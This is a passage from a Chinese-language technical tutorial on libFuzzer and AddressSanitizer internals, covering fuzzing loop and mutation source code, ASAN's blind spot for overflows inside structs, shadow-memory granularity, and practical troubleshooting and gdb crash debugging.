WRITE of size 1 at 0x602000000020 thread T0
    #0 0x4c51f3 in main (/home/ubuntu/Desktop/instrument_note/test_case_6+0x4c51f3)
    #1 0x7f99e1bb6cb1 in __libc_start_main csu/../csu/libc-start.c:314:16
    #2 0x41b2bd in _start (/home/ubuntu/Desktop/instrument_note/test_case_6+0x41b2bd)

...
</code></pre>
<p>ASAN为什么会检测失败呢?简单地说,ASAN认为struct结构体是一块连续的内存,即使在内部出现了**char[]**这样的连续数组,即使是触发越界都不会认为是错误.那么我们来看一个真实的例子,qemu usb模块越权读写漏洞CVE-2020-14364.</p>
<pre><code class="language-c">struct USBDevice {
    DeviceState qdev;
    // ...

    int32_t state;
    uint8_t setup_buf[8];
    uint8_t data_buf[4096];
    int32_t remote_wakeup;
    int32_t setup_state;
    int32_t setup_len;
    int32_t setup_index;

    USBEndpoint ep_ctl;
    USBEndpoint ep_in[USB_MAX_ENDPOINTS];
    USBEndpoint ep_out[USB_MAX_ENDPOINTS];

    // ...
};
</code></pre>
<p>对data_buf进行越界操作,此时ASAN就无法检测出来漏洞了.qemu的设备对象大部分都是这样声明的,所以就导致即使fuzzer跑出了漏洞,ASAN仍然认为是<em>正常的</em>.</p>
<p>为了解决这个问题,笔者重新对ASAN的插桩代码进行修改,核心思想是:</p>
<ol>
<li>插桩阶段遍历所有GetElementPtrInst指令,如果指令中存在<code>char[]</code>这种Array型变量,那么就在该结构体最后创建新字段用于保存该buffer在ShadowTable中的映射.然后再调整结构体中新字段偏移,让<code>instrumentMop()</code>生成的插桩检测逻辑使用ShadowTable中的分配内存来检测而不是原来的结构体内存.</li>
<li>栈平衡阶段对所有结构体中新创建的字段保存<code>malloc()</code>分配的内存,此时越界是可以被内存检测的.</li>
</ol>
<p>修改过后的Demo效果如下:</p>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/Asan-fix-Demo.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="llvm下的插桩简述-1"><a class="header" href="#llvm下的插桩简述-1">LLVM下的插桩简述</a></h2>
<p>关于LLVM的编译过程网上已经有很多的分析,在此挑选出与本文相关的地方做简单的复述:</p>
<ol>
<li>LLVM前端把代码序列化为AST树,编译成LLVM IR.</li>
<li>编译为LLVM IR后,通过各个模块(Pass)进行分析,优化与插桩.</li>
<li>编译为目标平台二进制字节码.</li>
<li>符号链接,生成可执行文件.</li>
</ol>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/Compile-time-instrumentation-flow-in-LLVM.png" alt="" /></p>
<p>本文要讨论的插桩技术包含Sanitizer-Coverage和ASAN,它们在LLVM中分别存在于Pass和Compiler-RT中.简单地说,Pass提供插桩的功能,Compiler-RT中提供了运行时支持的内部接口函数,下面从最容易入手的Sanitizer-Coverage开始实现代码覆盖率的统计.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="libfuzzer原理-1"><a class="header" href="#libfuzzer原理-1">libFuzzer原理</a></h2>
<p>用过libFuzzer和AFL的读者们应该知道,这两款Fuzzer工具核心原理是:它们都会使用数据样本来生成测试数据集,然后使用新生成的测试数据调用程序执行并根据程序插桩的逻辑捕获到执行的分支信息,以此判断新的测试数据有没有发现新的执行路径,如果有发现新执行路径则记录测试数据,后续继续使用基于测试数据变异,不断以此循环.</p>
<p>关于libFuzzer最经典的教程在这里(https://github.com/Dor1s/libfuzzer-workshop),本文着重介绍libFuzzer工具本身的原理,不再复述libFuzzer的用法.</p>
<p>关于libFuzzer的实现代码,在LLVM的<code>\llvm-project\compiler-rt\lib\fuzzer\</code>目录下.</p>
<h4 id="libfuzzer执行fuzzer过程-1"><a class="header" href="#libfuzzer执行fuzzer过程-1">libFuzzer执行Fuzzer过程</a></h4>
<p>本章使用libFuzzer-workshop教程的OpenSSL心脏滴血漏洞来做讲解,相关代码在这里(https://github.com/Dor1s/libfuzzer-workshop/blob/master/lessons/05/openssl_fuzzer.cc),其中核心Fuzzing代码如下:</p>
<pre><code class="language-c++">extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
  static SSL_CTX *sctx = Init();
  SSL *server = SSL_new(sctx);
  BIO *sinbio = BIO_new(BIO_s_mem());
  BIO *soutbio = BIO_new(BIO_s_mem());
  SSL_set_bio(server, sinbio, soutbio);
  SSL_set_accept_state(server);
  BIO_write(sinbio, data, size);
  SSL_do_handshake(server);
  SSL_free(server);
  return 0;
}
</code></pre>
<p>libFuzzer以<code>LLVMFuzzerTestOneInput()</code>作为用户自定义的模糊测试入口点,用户只需要关注为libFuzzer生成的数据编写接口调用逻辑,而libFuzzer本身只需要做好数据生成即可.libFuzzer的数据生成主要由三部分构成:</p>
<ol>
<li>用户指定的初始数据</li>
<li>数据变异</li>
<li>新路径发现</li>
</ol>
<p>libFuzzer工作过程也可以简单地归纳为:</p>
<ol>
<li>初始化</li>
<li>生成数据</li>
<li>开始测试</li>
<li>收集代码覆盖率信息</li>
<li>生成数据</li>
<li>开始测试</li>
<li>...以此类推</li>
</ol>
<p>对以上的执行过程有了印象之后,那么我们就开始对libFuzzer的源码进行探索.FuzzerDriver.cpp文件的FuzzerDriver()函数是libFuzzer的入口点.</p>
<pre><code class="language-c++">int FuzzerDriver(int *argc, char ***argv, UserCallback Callback) {
   // 省略代码
  if (EF-&gt;LLVMFuzzerInitialize) // 如果用户有自定义LLVMFuzzerInitialize()实现,那么就执行该函数,提供这个函数的作为用户自定义实现接口是因为要对库/程序进行初始化
    EF-&gt;LLVMFuzzerInitialize(argc, argv);
   // 省略程序解析外部参数代码

  unsigned Seed = Flags.seed; // 如果外部有传递随机数种子的话.参数为-seed=?
  if (Seed == 0)
    Seed = std::chrono::system_clock::now().time_since_epoch().count() + GetPid(); // 外部没有指定随机数种子,那就使用时间戳+pid
  if (Flags.verbosity) // 调试输出,参数为-verbosity
    Printf(&quot;INFO: Seed: %u\n&quot;, Seed);

  Random Rand(Seed); // 随机数生成器
  auto *MD = new MutationDispatcher(Rand, Options); // 数据变异生成器
  auto *Corpus = new InputCorpus(Options.OutputCorpus); // 数据收集器
  auto *F = new Fuzzer(Callback, *Corpus, *MD, Options); // Fuzzer核心逻辑模块

  StartRssThread(F, Flags.rss_limit_mb); // 创建内存检测线程,如果当前进程的内存占用超过阈值之后就退出Fuzzer报告异常

  Options.HandleAbrt = Flags.handle_abrt;
  Options.HandleBus = Flags.handle_bus;
  Options.HandleFpe = Flags.handle_fpe;
  Options.HandleIll = Flags.handle_ill;
  Options.HandleInt = Flags.handle_int;
  Options.HandleSegv = Flags.handle_segv;
  Options.HandleTerm = Flags.handle_term;
  Options.HandleXfsz = Flags.handle_xfsz;
  SetSignalHandler(Options);  // 初始化信号捕获回调函数

   // 省略代码
  F-&gt;Loop(); // 开始Fuzzing

  exit(0);
}
</code></pre>
<p>通过分析libFuzzer的启动过程我们可知,它整个框架的核心由:</p>
<ul>
<li>
<p>数据变异生成器</p>
</li>
<li>
<p>数据收集器</p>
</li>
<li>
<p>Fuzzer核心逻辑模块</p>
<p>组成.接下来我们应该梳理清楚这三个模块之间的关系,接着前面的分析,我们继续阅读<code>Fuzzer::Loop()</code>的代码.</p>
</li>
</ul>
<pre><code class="language-c++">void Fuzzer::Loop() {
   // 省略代码
  while (true) {
    // 省略代码
    if (TimedOut()) break; // 由参数-max_total_time指定的运行时间控制,超时执行就退出
    // Perform several mutations and runs.
    MutateAndTestOne(); // 执行一次Fuzzing
  }
  // 省略代码
}

void Fuzzer::MutateAndTestOne() {
  auto &amp;II = Corpus.ChooseUnitToMutate(MD.GetRand());  // 从数据收集器中随机挑一个测试数据出来,要结合下面的核心逻辑代码才能理解它的用意
  const auto &amp;U = II.U;
  size_t Size = U.size();
  memcpy(CurrentUnitData, U.data(), Size);  //  获取测试数据

  // 省略代码

  for (int i = 0; i &lt; Options.MutateDepth; i++) {  // 对数据变异多次.由参数-mutate_depth控制,默认值是5
    size_t NewSize = 0;
    NewSize = MD.Mutate(CurrentUnitData, Size, CurrentMaxMutationLen); // 使用前面随机抽取获取到的测试数据作为变异输入生成测试数据
    Size = NewSize;
    if (i == 0)  // 注意,第一次Fuzzing时,会启用数据追踪功能,简而言之就是hook strstr(),strcasestr(),memmem()函数,然后从参数中获取到一些有意思的字符串
      StartTraceRecording();
    II.NumExecutedMutations++;
    if (size_t NumFeatures = RunOne(CurrentUnitData, Size)) {  // 开始Fuzzing,如果使用前面生成的变异数据拿去Fuzzing,发现了新的路径数量,就会保存到NumFeatures,没有发现新路径则NumFeatures=0.
      Corpus.AddToCorpus({CurrentUnitData, CurrentUnitData + Size}, NumFeatures,
                         /*MayDeleteFile=*/true);  // 注意,这一段代码是libFuzzer的核心逻辑之一,如果变异数据发现新路径,那就记录该数据到数据收集器.这是libFuzzer路径探测的核心原理.
      ReportNewCoverage(&amp;II, {CurrentUnitData, CurrentUnitData + Size});
      CheckExitOnSrcPosOrItem();
    }
    StopTraceRecording();
    TryDetectingAMemoryLeak(CurrentUnitData, Size,
                            /*DuringInitialCorpusExecution*/ false);
  }
}

size_t Fuzzer::RunOne(const uint8_t *Data, size_t Size) {
  ExecuteCallback(Data, Size);  // 往下就是调用到LLVMFuzzerTestOneInput()
  TPC.UpdateCodeIntensityRecord(TPC.GetCodeIntensity());  // 获取当前执行过的代码分支总数

  size_t NumUpdatesBefore = Corpus.NumFeatureUpdates();
  TPC.CollectFeatures([&amp;](size_t Feature) {
    Corpus.AddFeature(Feature, Size, Options.Shrink);
  });
  size_t NumUpdatesAfter = Corpus.NumFeatureUpdates();  // 从SanitizerCoverage插桩记录的信息中获取分支数据

  // 省略代码

  return NumUpdatesAfter - NumUpdatesBefore;  // 计算发现了多少新分支路径
}
</code></pre>
<p>明白libFuzzer的主要Fuzzing原理后,我们现在探讨下代码覆盖率的实现细节.首先,libFuzzer TracePC(TPC)类是专门用于收集使用SanitizerCoverage插桩获取到的信息,代码实现在FuzzerTracePC.cpp文件下.</p>
<pre><code class="language-c++">ATTRIBUTE_INTERFACE
void __sanitizer_cov_trace_pc_guard_init(uint32_t *Start, uint32_t *Stop) {
  fuzzer::TPC.HandleInit(Start, Stop);
}

ATTRIBUTE_INTERFACE
ATTRIBUTE_NO_SANITIZE_ALL
void __sanitizer_cov_trace_pc_guard(uint32_t *Guard) {
  uintptr_t PC = reinterpret_cast&lt;uintptr_t&gt;(__builtin_return_address(0));
  uint32_t Idx = *Guard;

  getStackDepth();
  fuzzer::codeIntensity++;

  __sancov_trace_pc_pcs[Idx] = PC;
  __sancov_trace_pc_guard_8bit_counters[Idx]++;
}
</code></pre>
<p>理解这个细节后,再回来看核心逻辑<code>Fuzzer::ExecuteCallback()</code>.</p>
<pre><code class="language-c++">void Fuzzer::ExecuteCallback(const uint8_t *Data, size_t Size) {
  // 省略代码
  uint8_t *DataCopy = new uint8_t[Size];
  memcpy(DataCopy, Data, Size);  // 从变异的数据中复制一份到这个内存,后面会用到
  // 省略代码
  TPC.ResetMaps();  // 清空所有路径信息
  RunningCB = true;
  int Res = CB(DataCopy, Size);  // 执行用户自定义的LLVMFuzzerTestOneInput()
  RunningCB = false;
  // 省略代码
  if (!LooseMemeq(DataCopy, Data, Size))  // 注意这个坑,如果传递给LLVMFuzzerTestOneInput()的data会被程序修改,那么libFuzzer会强制退出
    CrashOnOverwrittenData();
  delete[] DataCopy;
}
</code></pre>
<h4 id="数据生成原理-1"><a class="header" href="#数据生成原理-1">数据生成原理</a></h4>
<p>对整个Fuzzing过程清晰后,我们回来探索libFuzzer的数据生成原理,对应数据变异模块<code>MutationDispatcher</code>.</p>
<pre><code class="language-c++">MutationDispatcher::MutationDispatcher(Random &amp;Rand,const FuzzingOptions &amp;Options)
    : Rand(Rand), Options(Options) {  // Rand是随机数生成器
  DefaultMutators.insert(
      DefaultMutators.begin(),  // 添加数据变异算法
      {
          {&amp;MutationDispatcher::Mutate_EraseBytes, &quot;EraseBytes&quot;},
          {&amp;MutationDispatcher::Mutate_InsertByte, &quot;InsertByte&quot;},
          {&amp;MutationDispatcher::Mutate_InsertRepeatedBytes,
           &quot;InsertRepeatedBytes&quot;},
          {&amp;MutationDispatcher::Mutate_ChangeByte, &quot;ChangeByte&quot;},
          {&amp;MutationDispatcher::Mutate_ChangeBit, &quot;ChangeBit&quot;},
          {&amp;MutationDispatcher::Mutate_ShuffleBytes, &quot;ShuffleBytes&quot;},
          {&amp;MutationDispatcher::Mutate_ChangeASCIIInteger, &quot;ChangeASCIIInt&quot;},
          {&amp;MutationDispatcher::Mutate_ChangeBinaryInteger, &quot;ChangeBinInt&quot;},
          {&amp;MutationDispatcher::Mutate_CopyPart, &quot;CopyPart&quot;},
          {&amp;MutationDispatcher::Mutate_CrossOver, &quot;CrossOver&quot;},
          {&amp;MutationDispatcher::Mutate_AddWordFromManualDictionary,
           &quot;ManualDict&quot;},
          {&amp;MutationDispatcher::Mutate_AddWordFromTemporaryAutoDictionary,
           &quot;TempAutoDict&quot;},
          {&amp;MutationDispatcher::Mutate_AddWordFromPersistentAutoDictionary,
           &quot;PersAutoDict&quot;},
      });
  if(Options.UseCmp)
    DefaultMutators.push_back(
        {&amp;MutationDispatcher::Mutate_AddWordFromTORC, &quot;CMP&quot;});

  if (EF-&gt;LLVMFuzzerCustomMutator)  // 如果存在用户自定义的数据变异方法,那就使用它
    Mutators.push_back({&amp;MutationDispatcher::Mutate_Custom, &quot;Custom&quot;});
  else
    Mutators = DefaultMutators;

  if (EF-&gt;LLVMFuzzerCustomCrossOver)
    Mutators.push_back(
        {&amp;MutationDispatcher::Mutate_CustomCrossOver, &quot;CustomCrossOver&quot;});
}
</code></pre>
<p>关于数据变异的算法读者们自行阅读,这些变异方法基本上都差不多.笔者画图整理全部的逻辑,读者们就能对此一目了然.</p>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/libFuzzer-Mutate.png" alt="" /></p>
<h4 id="路径探测原理-1"><a class="header" href="#路径探测原理-1">路径探测原理</a></h4>
<p>前面有简略地提到这点,简单总结整体流程如下:</p>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/libFuzzer-PathSearch.png" alt="" /></p>
<p>本章最后,把libFuzzer数据变异和路径探测结合在一起的完整过程如下所示.</p>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/libFuzzer-Arch.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="参考引用-1"><a class="header" href="#参考引用-1">参考引用</a></h2>
<ol>
<li>Compile-time-instrumentation-flow-in-LLVM(https://www.researchgate.net/figure/Compile-time-instrumentation-flow-in-LLVM_fig1_262175489)</li>
<li>LLVM Sanitizer-Coverage Document(https://clang.llvm.org/docs/SanitizerCoverage.html)</li>
<li>LLVM Source-based Code Coverage(https://bcain-llvm.readthedocs.io/projects/clang/en/release_50/SourceBasedCodeCoverage/)</li>
<li>libfuzzer-workshop(https://github.com/Dor1s/libfuzzer-workshop)</li>
<li>LLVM AddressSanitizer Document(https://clang.llvm.org/docs/AddressSanitizer.html)</li>
<li>AddressSanitizer Wiki(https://github.com/google/sanitizers/wiki/AddressSanitizer)</li>
<li>llvm::MemIntrinsic Class Reference(https://llvm.org/doxygen/classllvm_1_1MemIntrinsic.html)</li>
<li>llvm::IntrinsicInst Class Reference(https://llvm.org/doxygen/classllvm_1_1IntrinsicInst.html)</li>
<li>LLVM llvm-lifetime-start-intrinsic(https://llvm.org/docs/LangRef.html#llvm-lifetime-start-intrinsic)</li>
<li>llvm::AllocaInst Class Reference(https://llvm.org/doxygen/classllvm_1_1AllocaInst.html)</li>
<li>llvm::IRBuilder Class Template Reference(https://llvm.org/doxygen/classllvm_1_1IRBuilder.html)</li>
<li>C++全局构造和析构(https://www.jianshu.com/p/56ea6e9d00e9)</li>
<li>CVE-2020-14364 QEMU逃逸 漏洞分析 (含完整EXP)(https://mp.weixin.qq.com/s/MQyczZXRfOsIQewNf7cfXw)</li>
<li>libFuzzer Document(https://llvm.org/docs/LibFuzzer.html)</li>
<li>libFuzzer Source by guidovranken(https://github.com/guidovranken/libfuzzer-gv)</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="实战中asan会有哪些坑-1"><a class="header" href="#实战中asan会有哪些坑-1">实战中ASAN会有哪些坑</a></h2>
<h4 id="libasan库缺失如何解决-1"><a class="header" href="#libasan库缺失如何解决-1">libasan库缺失如何解决?</a></h4>
<p>使用ASAN时有概率会出现下面的问题.</p>
<pre><code class="language-sh">$ g++ -O -g -fsanitize=address heap-use-after-free.cpp

/usr/bin/ld: cannot find /usr/lib64/libasan.so.0.0.0
collect2: error: ld returned 1 exit status
</code></pre>
<p>这是因为在链接阶段没有找到libasan库,前文提到,ASAN的运行时函数是封装在Compiler-RT库中的.所以在正常的编译环境下它会在/usr/lib中出现.</p>
<pre><code class="language-sh">fuzzing@fuzzing-virtual-machine:~/Desktop/test_code$ find /usr/ | grep libasan
/usr/share/doc/libasan5
/usr/share/doc/libasan6
/usr/lib/gcc/x86_64-linux-gnu/8/libasan_preinit.o
/usr/lib/gcc/x86_64-linux-gnu/8/libasan.a
/usr/lib/gcc/x86_64-linux-gnu/8/libasan.so
/usr/lib/gcc/x86_64-linux-gnu/10/libasan_preinit.o
/usr/lib/gcc/x86_64-linux-gnu/10/libasan.a
/usr/lib/gcc/x86_64-linux-gnu/10/libasan.so
/usr/lib/x86_64-linux-gnu/libasan.so.5
/usr/lib/x86_64-linux-gnu/libasan.so.6
/usr/lib/x86_64-linux-gnu/libasan.so.6.0.0
/usr/lib/x86_64-linux-gnu/libasan.so.5.0.0
</code></pre>
<p>找不到libasan库有两种解决方法:</p>
<ul>
<li>联网环境下,使用<code>sudo apt install libasan</code>即可安装.</li>
<li>非联网环境下,找到LLVM Compiler-RT的源码下载编译并<code>make install</code>即可.</li>
</ul>
<h4 id="模糊测试中遇到老旧不维护的库一直产生崩溃怎么样让asan屏蔽对它的检测-1"><a class="header" href="#模糊测试中遇到老旧不维护的库一直产生崩溃怎么样让asan屏蔽对它的检测-1">模糊测试中遇到老旧不维护的库一直产生崩溃,怎么样让ASAN屏蔽对它的检测?</a></h4>
<p>对于这类一直让ASAN产生崩溃但是不知道如何修复的代码,我们可以使用ASAN的黑名单来禁止对这些指定的函数插桩,甚至只对某几个特定的函数做插桩检测.详情参考官方文档 https://clang.llvm.org/docs/SanitizerSpecialCaseList.html</p>
<h4 id="asan有哪些常用设置-1"><a class="header" href="#asan有哪些常用设置-1">ASAN有哪些常用设置?</a></h4>
<p>ASAN_OPTIONS</p>
<p>https://github.com/google/sanitizers/wiki/AddressSanitizerFlags</p>
<h4 id="shadow-table内存粒度有什么意义-1"><a class="header" href="#shadow-table内存粒度有什么意义-1">Shadow Table内存粒度有什么意义?</a></h4>
<p>Shadow Table需要分配一块比较大的内存,用于对程序对的堆和栈做映射.这块内存能够映射的大小是有限的,所以就需要找到一种方式在尽可能少的内存里面保存更多的内存映射.举个例子:</p>
<pre><code class="language-text">FF FF FF FF 00 00 00 00 00 00 00 00 FF FF FF FF
</code></pre>
<p>这块内存数据表示占用8字节缓冲区进行投毒的内存布局.如果程序中大量使用这样的内存,那么很容易就把ASAN的Shadow Table占满,于是我们就有压缩Shadow Table的需求.压缩之后,Shadow Table的内存布局就变成了:</p>
<pre><code class="language-text">FF FF FF FF 00 FF FF FF FF
</code></pre>
<p>此时内存占用变小了一半.现在我们再回过来理解内存粒度的概念,未优化时的内存粒度为1,优化之后的内存粒度为8.先来看直观的例子:</p>
<pre><code class="language-c">int main(int argc,char** argv) {
    char buffer[0x10] = {0};

    buffer[0x10] = 'C';

    return 1;
}

// 编译参数:clang -fsanitize=address ./test_asan_granularity.c -o ./test_asan_granularity
</code></pre>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/6.png" alt="" /></p>
<p>接下来尝试编译<code>clang -fsanitize=address -mllvm -asan-mapping-scale=4 ./test_asan_granularity.c -o ./test_asan_granularity</code>,ASAN的崩溃内容出现了异常.</p>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/7.png" alt="" /></p>
<p>接下来再观察这个测试用例.因为内存粒度为8字节(为什么要取值为8字节压缩呢?笔者猜测应该是对齐x64平台的数据类型),此时buffer占用4字节,剩下4字节变量a也在Shadow Table压缩的这块内存里.ASAN的处理方法是在这一字节的Shadow Table内存中记录一个标记,标识这里可能会存在内存越界(只要Shadow Table的值不为0就认为是有异常的).</p>
<pre><code class="language-c">int main(int argc,char** argv) {
    short buffer[2] = {0};
    long a;

    buffer[3] = 1024;

    return 1;
}
</code></pre>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/C:%5CUsers%5CFremy%5CDesktop%5Cvm%5Cinstrument%5Cpic12%5C8.png" alt="" /></p>
<p>现在我们就可以理解ASAN的这一行输出的意义了:</p>
<pre><code class="language-text">Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07   // &lt;&lt;&lt;&lt; 这里呀
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
</code></pre>
<p>它的意思是,当前被压缩的内存中存在n字节其它变量占用的内存(n=1-7).</p>
<h4 id="如何调试使用asan的程序-1"><a class="header" href="#如何调试使用asan的程序-1">如何调试使用ASAN的程序?</a></h4>
<p>一般地,ASAN崩溃有几种可能:</p>
<ul>
<li>
<p>ASAN初始化时崩溃,可能是机器上内存不足导致.</p>
</li>
<li>
<p>全局对象初始化时崩溃,比如说C++全局声明的类对象,它会在程序初始化阶段(还记得init_array嘛,就是在这里插入了回调函数实例化全局对象)执行,也会存在内存问题.</p>
</li>
<li>
<p>运行时库异常,常见于Windows平台上.</p>
</li>
<li>
<p>创建栈时崩溃.</p>
</li>
<li>
<p>项目代码崩溃.</p>
<p>笔者在上一小节测试内存粒度时遇到了ASAN在函数初始化的阶段创建Shadow Table时直接崩溃了.</p>
</li>
</ul>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/9.png" alt="" /></p>
<p>从输出我们可以知道,main函数的断点命中之后,接下来执行一次单步调试时就抛出ASAN的检测异常了,也就是说没有执行到用户在main函数中写的任何代码就崩溃了,那么产生崩溃肯定是在ASAN在创建Shadow Table初始化函数栈时触发的崩溃.我们把源程序反编译,查看0x4C500B的汇编.</p>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/C:%5CUsers%5CFremy%5CDesktop%5Cvm%5Cinstrument%5Cpic12%5C10.png" alt="" /></p>
<p>对应的LLVM IR:</p>
<pre><code class="language-llvm">  %21 = inttoptr i64 %20 to i64*
  store i64 -1012762419733073423, i64* %21, align 1
</code></pre>
<p>原来是对Shadow Table进行投毒时触发了内存异常,导致程序异常崩溃了,知道原因之后就有思路再去寻找办法解决问题,像这样奇奇怪怪的问题还有很多,只能通过调试去找到问题的根源再解决.</p>
<p>那么如何调试一次由用户代码触发的崩溃呢?笔者的方法是:</p>
<ul>
<li>
<p>根据ASAN栈崩溃信息定位到触发崩溃的代码,并分析漏洞原因是因为那些判断逻辑没有做好检验和关注变量内容.</p>
</li>
<li>
<p>根据猜想编写gdb脚本.</p>
</li>
<li>
<p>运行gdb观察值的变化.</p>
<p>举个例子,代码某个位置产生了越界访问,于是猜想是不是长度校验判断有问题,编写gdb脚本来监控这两个值的变化:</p>
</li>
</ul>
<pre><code class="language-gdb">b func1
command
b 1031
command
print &quot;&gt;&gt;&gt;&gt;&quot;
print &quot;Size=&quot;
print array_size
print &quot;offset=&quot;
print offset
c
end
c
end
</code></pre>
<p>然后使用gdb命令执行<code>gdb --command=./gdb_crash_analysis.gsh -arg ./fuzzer file ./crash</code>,观察崩溃前对应的数值.</p>
<pre><code>Breakpoint 2, func1 (this=0x7fffffffbae0, stream_0=0x7fffffffbb00, int_2=59852, int_3=1668261324, int_4=60, int_5=45056, int_6=1668246528, int_7=204,
    class508_0=..., rangeList1_0=0x7fffffff7820, list_0=std::vector of length 2, capacity 2 = {...}, list_1=std::vector of length 2, capacity 2 = {...},
    list_0_types=std::vector of length 2, capacity 2 = {...}) at Process.cpp
1468	                arrays[j] = *(stream_0-&gt;begin() + Position + j);
$6 = &quot;&gt;&gt;&gt;&gt;&quot;
$7 = &quot;Size=&quot;
$8 = 20
$9 = &quot;offset=&quot;
$10 = 1668261324  // &lt;&lt;&lt;&lt; Overflow !

Program received signal SIGSEGV, Segmentation fault.
0x000000000060980e in func1 (this=0x7fffffffbae0, stream_0=0x7fffffffbb00, int_2=59852, int_3=1668261324, int_4=60, int_5=45056, int_6=1668246528,
    int_7=204, class508_0=..., rangeList1_0=0x7fffffff7820, list_0=std::vector of length 2, capacity 2 = {...}, list_1=std::vector of length 2, capacity 2 = {...},
    list_0_types=std::vector of length 2, capacity 2 = {...}) at Process.cpp
1468	                arrays[j] = *(stream_0-&gt;begin() + Position + j);     ////  &lt;&lt;&lt;  Position = 1668261324
(gdb)

AddressSanitizer:DEADLYSIGNAL
=================================================================
==2995382==ERROR: AddressSanitizer: SEGV on unknown address 0x7ff2203d3dcc (pc 0x000000609846 bp 0x7ffc18159c50 sp 0x7ffc18157760 T0)
==2995382==The signal is caused by a READ memory access.
    #0 0x609846 in func1(std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;*, int, int, int, int, int, int, C508, RangeList*, std::vector&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt;, std::allocator&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt; &gt; &gt;&amp;, std::vector&lt;int, std::allocator&lt;int&gt; &gt;&amp;, std::vector&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt;, std::allocator&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt; &gt; &gt;&amp;) Process.cpp
    #1 0x6006e7 in func1(FileReaderHelp*, FileInfo, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;&amp;, St*, Struct90) Process.cpp
    # ....
    #9 0x54c65b in main fuzz_main.cpp
    #10 0x7ff1c3c26cb1 in __libc_start_main csu/../csu/libc-start.c:314:16
    #11 0x411c0d in _start (v5+0x411c0d)
</code></pre>
<h4 id="x64-asan为什么不兼容-1"><a class="header" href="#x64-asan为什么不兼容-1">x64 ASAN为什么不兼容?</a></h4>
<p>有时候在64位平台上使用ASAN编译会提示以下错误(参考链接:https://stackoverflow.com/questions/59007118/how-to-enable-address-sanitizer-at-godbolt-org/59010436#59010436):</p>
<pre><code class="language-text">==3==ERROR: AddressSanitizer failed to allocate 0xdfff0001000 (15392894357504) bytes at address 2008fff7000 (errno: 12)
==3==ReserveShadowMemoryRange failed while trying to map 0xdfff0001000 bytes. Perhaps you're using ulimit -v
</code></pre>
<p>在32位引入ASAN编译时,Shadow Table分配内存占用几百MB.但是使用64位ASAN编译时会占用20T内存,因为malloc分配这么大的内存失败,才提示了这个错误.解决方法一般有两个:1.直接限制内存分配大小,让malloc()成功分配;2.设置虚拟内存到交换分区.</p>
<p>ASAN官方的解决方法是使用ulimit命令来限制内存使用(参考引用:https://github.com/mirrorer/afl/blob/master/docs/notes_for_asan.txt),但是这个方式并不一定有效.所以我们可以使用虚拟内存映射到磁盘交互分区的方式再次尝试(参考引用:https://qastack.cn/unix/44985/limit-memory-usage-for-a-single-linux-process)</p>
<h4 id="asan-for-windows使用msvc还是llvm-1"><a class="header" href="#asan-for-windows使用msvc还是llvm-1">ASAN for Windows使用MSVC还是LLVM?</a></h4>
<p>https://developercommunity.visualstudio.com/t/enabled-asan-address-sanitizer-for-x64-build-cause/1139763</p>
